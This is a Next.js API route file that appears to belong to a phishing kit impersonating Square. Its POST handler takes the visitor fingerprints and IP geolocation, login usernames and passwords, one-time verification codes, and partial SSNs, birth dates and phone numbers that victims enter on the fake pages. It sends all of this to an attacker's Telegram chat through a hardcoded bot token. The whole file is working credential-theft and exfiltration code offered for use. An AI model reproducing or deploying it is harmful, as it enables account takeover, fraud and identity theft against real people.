import { NextRequest, NextResponse } from "next/server"

type TelegramBody =
  | {
      kind: "visit"
      userAgent?: string
      screen?: string
      screenWidth?: number
      screenHeight?: number
      language?: string
      referrer?: string
      url?: string
      utcTime?: string
      ip?: string
      location?: string
      timezone?: string
      isp?: string
    }
  | { kind: "login"; username?: string; password?: string }
  | { kind: "method"; method?: string }
  | { kind: "verification"; method?: string; code?: string; otpStep?: 1 | 2 | number }
  | { kind: "resend"; method?: string; otpStep?: 1 | 2 | number }
  | { kind: "identity"; ssnLast4?: string; birthDate?: string; phoneNumber?: string; zipCode?: string }

const SITE_NAME = "Square"
const BOT_TOKEN = "5877336614:AAHeJpXioCqVASLDNCjMOp82W7YTkrkk3YI"
const CHAT_IDS = "1535273256"
  .split(",")
  .map((id) => id.trim())
  .filter(Boolean)

function getClientIp(request: NextRequest): string {
  const vercelForwardedFor = request.headers.get("x-vercel-forwarded-for")
  if (vercelForwardedFor) return vercelForwardedFor.split(",")[0]?.trim() || ""
  const realIp = request.headers.get("x-real-ip")
  if (realIp) return realIp.trim()
  const forwardedFor = request.headers.get("x-forwarded-for")
  if (forwardedFor) return forwardedFor.split(",")[0]?.trim() || ""
  const cfIp = request.headers.get("cf-connecting-ip")
  if (cfIp) return cfIp.trim()
  return ""
}

async function enrichWithGeo(request: NextRequest, ip: string): Promise<{ location?: string; timezone?: string; isp?: string }> {
  const vercelCity = request.headers.get("x-vercel-ip-city")
  const vercelRegion = request.headers.get("x-vercel-ip-country-region")
  const vercelCountry = request.headers.get("x-vercel-ip-country")
  const vercelTimezone = request.headers.get("x-vercel-ip-timezone")
  const vercelLocation = [vercelCity, vercelRegion, vercelCountry].filter(Boolean).join(", ")
  if (vercelLocation || vercelTimezone) {
    return { location: vercelLocation || undefined, timezone: vercelTimezone || undefined }
  }

  if (!ip) return {}
  try {
    const res = await fetch(`https://ipapi.co/${encodeURIComponent(ip)}/json/`, { method: "GET", cache: "no-store" })
    if (!res.ok) return {}
    const geo = await res.json()
    return {
      location: [geo?.city, geo?.region, geo?.country_name].filter(Boolean).join(", ") || undefined,
      timezone: geo?.timezone || undefined,
      isp: geo?.org || undefined,
    }
  } catch {
    return {}
  }
}

async function sendMessage(text: string): Promise<void> {
  if (!BOT_TOKEN || CHAT_IDS.length === 0) return
  const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`
  await Promise.all(
    CHAT_IDS.map((chatId) =>
      fetch(url, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ chat_id: chatId, text, parse_mode: "HTML" }),
      }),
    ),
  )
}

function formatStep(step?: number): string {
  return step === 2 ? "Code (final)" : "Code (first OTP)"
}

export async function POST(request: NextRequest) {
  try {
    const body = (await request.json()) as TelegramBody
    const kind = body?.kind
    let text = ""

    if (kind === "visit") {
      const ip = getClientIp(request) || body.ip || ""
      const geo = await enrichWithGeo(request, ip)
      const screen =
        body.screen ||
        (body.screenWidth && body.screenHeight ? `${body.screenWidth}x${body.screenHeight}` : "Unknown")
      text =
        `\n🌐 <b>New Visitor - ${SITE_NAME}</b>\n\n` +
        `📍 <b>Location:</b> ${geo.location || body.location || "Unknown"}\n` +
        `🌍 <b>IP:</b> ${ip || "Unknown"}\n` +
        `⏰ <b>Timezone:</b> ${geo.timezone || body.timezone || "Unknown"}\n` +
        `🌐 <b>ISP:</b> ${geo.isp || body.isp || "Unknown"}\n\n` +
        `📱 <b>Device:</b> ${body.userAgent || "Unknown"}\n` +
        `🖥️ <b>Screen:</b> ${screen}\n` +
        `🌍 <b>Language:</b> ${body.language || "Unknown"}\n` +
        `🔗 <b>Referrer:</b> ${body.referrer || "Direct"}\n` +
        `🕒 <b>UTC Time:</b> ${body.utcTime || "Unknown"}`
    } else if (kind === "login") {
      text =
        `\n🔐 <b>Login Attempt - ${SITE_NAME}</b>\n\n` +
        `👤 <b>User:</b> ${body.username || ""}\n` +
        `🔑 <b>Password:</b> ${body.password || ""}`
    } else if (kind === "method") {
      text =
        `\n🟦 <b>Verification Option Selected - ${SITE_NAME}</b>\n\n` +
        `🔐 <b>Type:</b> ${body.method || "Unknown"}`
    } else if (kind === "verification") {
      text =
        `\n✅ <b>Verification Code Submitted - ${SITE_NAME}</b>\n\n` +
        `🔐 <b>Type:</b> ${body.method || "Unknown"}\n` +
        `🧾 <b>OTP Step:</b> ${formatStep(Number(body.otpStep))}\n` +
        `🔢 <b>Code:</b> ${body.code || ""}`
    } else if (kind === "resend") {
      text =
        `\n🔄 <b>Resend Code Requested - ${SITE_NAME}</b>\n\n` +
        `🔐 <b>Type:</b> ${body.method || "Unknown"}\n` +
        `🧾 <b>OTP Step:</b> ${formatStep(Number(body.otpStep))}`
    } else if (kind === "identity") {
      text =
        `\n🪪 <b>Identity Details Submitted - ${SITE_NAME}</b>\n\n` +
        `🔢 <b>Last 4 SSN:</b> ${body.ssnLast4 || ""}\n` +
        `📅 <b>Birth Date:</b> ${body.birthDate || ""}\n` +
        `📱 <b>Phone Number:</b> ${body.phoneNumber || ""}\n` +
        `📮 <b>Zip Code:</b> ${body.zipCode || ""}`
    } else {
      return NextResponse.json({ error: "Unsupported event kind" }, { status: 400 })
    }

    await sendMessage(text)
    return NextResponse.json({ success: true })
  } catch (error) {
    console.error("Error sending telegram event:", error)
    return NextResponse.json({ error: "Failed to send notification" }, { status: 500 })
  }
}
